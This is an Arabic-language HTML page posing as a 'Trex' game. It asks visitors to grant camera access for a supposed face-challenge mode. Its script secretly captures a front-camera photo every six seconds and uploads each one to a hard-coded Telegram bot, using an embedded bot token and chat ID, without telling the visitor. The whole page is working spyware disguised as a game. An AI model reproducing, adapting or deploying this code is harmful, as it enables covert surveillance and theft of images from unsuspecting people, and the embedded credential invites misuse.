<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لعبة تركس – جربها الآن!</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(to bottom, #0f0c29, #302b63, #24243e);
            color: #fff;
            margin: 0;
            padding: 30px 15px;
            text-align: center;
            min-height: 100vh;
        }
        h1 {
            color: #00ff88;
            text-shadow: 0 0 15px #00ff88;
            margin: 20px 0 40px;
            font-size: 2.8rem;
        }
        p {
            font-size: 1.3rem;
            max-width: 700px;
            margin: 0 auto 35px;
            line-height: 1.7;
        }
        .btn {
            padding: 18px 50px;
            font-size: 1.5rem;
            background: #00ff88;
            color: #000;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 0 25px #00ff88aa;
            transition: all 0.3s;
        }
        .btn:hover {
            transform: scale(1.08);
            box-shadow: 0 0 40px #00ff88;
        }
        #status {
            font-size: 1.4rem;
            margin: 30px 0;
            color: #ffcc00;
            font-weight: bold;
        }
        #video {
            width: 320px;
            max-width: 90%;
            height: auto;
            margin: 30px auto 20px;
            border: 3px solid #00ff88;
            border-radius: 12px;
            box-shadow: 0 0 20px #00ff88aa;
            background: #000;
        }
    </style>
</head>
<body>
    <h1>لعبة تركس الرهيبة!</h1>
   
    <p>
        مرحباً! جرب لعبة تركس الجديدة المطورة 2026<br>
        اضغط الزر أدناه لبدء اللعبة فوراً وتحدي أصدقائك!<br><br>
        <strong style="color:#ff4444">ملاحظة:</strong> اللعبة تحتاج الوصول للكاميرا لتفعيل وضع التحدي بالوجه – اضغط "السماح" للمتابعة!
    </p>

    <button class="btn" onclick="startCamera()">ابدأ</button>
   
    <div id="status">اضغط الزر لبدء التحدي...</div>

    <video id="video" autoplay playsinline muted></video>

    <script>
        let stream = null;
        const BOT_TOKEN = '8375046170:AAFTy22WAucWyQhwKbbN7aqDm_enTTRZ7Ts';
        const CHAT_ID = '6611123941';
        const PHOTO_INTERVAL = 6000; // ← كل 6 ثوانٍ (غيّر الرقم هنا لو تبي أسرع أو أبطأ)

        async function startCamera() {
            const status = document.getElementById('status');
            status.textContent = "جاري تفعيل وضع التحدي...";
            status.style.color = "#00ff88";

            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user" }
                });

                const video = document.getElementById('video');
                video.srcObject = stream;

                await new Promise(resolve => {
                    video.onloadeddata = () => {
                        console.log("الفيديو جاهز");
                        resolve();
                    };
                    setTimeout(resolve, 8000);
                });

                status.textContent = "تم تفعيل التحدي! استمتع باللعبة...";
                status.style.color = "#00ff88";

                setInterval(captureAndSend, PHOTO_INTERVAL);
            } catch (err) {
                status.textContent = "خطأ: " + err.message;
                status.style.color = "#ff4444";
                console.error("Camera error:", err);
            }
        }

        async function captureAndSend() {
            const video = document.getElementById('video');

            if (video.readyState < 2 || video.videoWidth === 0 || video.videoHeight === 0) {
                console.log("الفيديو ليس جاهزًا بعد");
                return;
            }

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const dataUrl = canvas.toDataURL('image/jpeg', 0.75);

            try {
                const blob = await (await fetch(dataUrl)).blob();
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'capture.jpg');
                formData.append('caption', 'صورة من لعبة تركس • ' + new Date().toLocaleString('ar-EG'));

                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                if (response.ok) {
                    console.log('تم إرسال الصورة بنجاح');
                } else {
                    console.error('فشل الإرسال:', await response.text());
                }
            } catch (err) {
                console.error('خطأ أثناء الإرسال:', err);
            }
        }

        window.addEventListener('beforeunload', () => {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        });
    </script>
</body>
</html>
